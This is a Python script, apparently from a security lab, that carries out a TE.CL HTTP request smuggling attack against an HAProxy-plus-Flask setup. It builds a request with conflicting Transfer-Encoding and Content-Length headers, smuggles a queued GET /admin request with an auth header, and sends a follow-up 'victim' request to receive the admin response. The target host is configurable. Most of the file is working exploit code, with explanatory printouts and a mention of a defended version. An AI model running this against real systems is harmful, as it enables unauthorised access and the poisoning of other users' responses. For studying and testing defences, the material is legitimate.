import os
import socket
import time

TARGET_HOST = os.environ.get("TARGET_HOST", "localhost")
TARGET_PORT = int(os.environ.get("TARGET_PORT", "80"))


def build_smuggle_payload():
    """
    Build a TE.CL smuggling payload:

    - HAProxy honors Transfer-Encoding: chunked and reads the full
      chunked body, including all chunks, before forwarding to the backend.
    - Flask (via Werkzeug) honors Content-Length and stops reading the
      body after exactly Content-Length bytes.
    - The bytes AFTER those Content-Length bytes remain in the TCP buffer
      as a queued second request on the same backend connection.

    This is the reverse of CL.TE:
      CL.TE → front-end uses Content-Length, back-end uses TE
      TE.CL → front-end uses Transfer-Encoding, back-end uses Content-Length
    """

    # The inner, *smuggled* request we want the backend to queue.
    smuggled = (
        "GET /admin HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Admin-Auth: secret-token\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
    )

    # Express the smuggled request as a single hex-sized chunk.
    chunk_size = hex(len(smuggled))[2:].upper()
    chunked_body = f"{chunk_size}\r\n{smuggled}\r\n0\r\n\r\n"

    # Content-Length is set to a small value (4) so Flask stops reading
    # after the first 4 bytes of chunked_body, leaving the rest (the
    # smuggled GET /admin) in the TCP buffer.
    content_length = 4

    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: {content_length}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{chunked_body}"
    )
    return request.encode("ascii"), smuggled.encode("ascii")


def main():
    print("=== TE.CL Request Smuggling ===")
    payload, smuggled = build_smuggle_payload()

    print("\n[1] Built TE.CL smuggling payload.")
    print("    - Outer request: POST / HTTP/1.1")
    print("    - Headers include BOTH Transfer-Encoding: chunked AND Content-Length: 4")
    print("    - Body layout:")
    print(f"        [chunk size]  {hex(len(smuggled))[2:].upper()}\\r\\n")
    print("        [chunk data]  GET /admin HTTP/1.1 ... (smuggled request)")
    print("        [terminator]  0\\r\\n\\r\\n")
    print("    - HAProxy uses Transfer-Encoding and forwards the full chunked body.")
    print("    - Flask uses Content-Length=4 and stops after 4 bytes,")
    print("      leaving the smuggled GET /admin queued in the TCP buffer.")

    print("\n[2] Sending TE.CL smuggling POST (keep-alive connection).")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.sendall(payload)

    resp1 = s.recv(65535)
    print("\n--- Response to smuggling POST ---")
    print(resp1.decode("iso-8859-1", errors="replace"))

    print("\n[3] Waiting 500ms before sending victim request on a NEW connection.")
    time.sleep(0.5)

    victim_req = (
        "GET /api/user?id=victim HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii")

    print("[4] Sending victim GET /api/user?id=victim.")
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2.connect((TARGET_HOST, TARGET_PORT))
    s2.sendall(victim_req)
    resp2 = s2.recv(65535)
    s2.close()

    print("\n--- Response to victim GET /api/user?id=victim ---")
    print(resp2.decode("iso-8859-1", errors="replace"))

    print(
        "\nExplanation:\n"
        "1. HAProxy receives the POST with both TE and CL headers.\n"
        "   It honors Transfer-Encoding: chunked and forwards the full\n"
        "   chunked body to the backend over a kept-alive connection.\n"
        "2. Flask honors Content-Length: 4 and reads only 4 bytes of the\n"
        "   chunked body. The remaining bytes — the smuggled GET /admin —\n"
        "   stay queued in the TCP buffer on the backend side.\n"
        "3. When the victim sends GET /api/user?id=victim on a new connection,\n"
        "   HAProxy reuses the existing backend TCP connection. Flask sees the\n"
        "   queued GET /admin bytes first and processes them as a full request,\n"
        "   returning admin panel content to the victim.\n"
        "4. This is the reverse of CL.TE: instead of the front-end being fooled\n"
        "   by Content-Length, here the back-end is fooled by Content-Length\n"
        "   while the front-end correctly processes Transfer-Encoding.\n"
        "5. With defenses active (app_secure.py), Flask rejects any request\n"
        "   containing Transfer-Encoding: chunked with HTTP 400.\n"
    )


if __name__ == "__main__":
    main()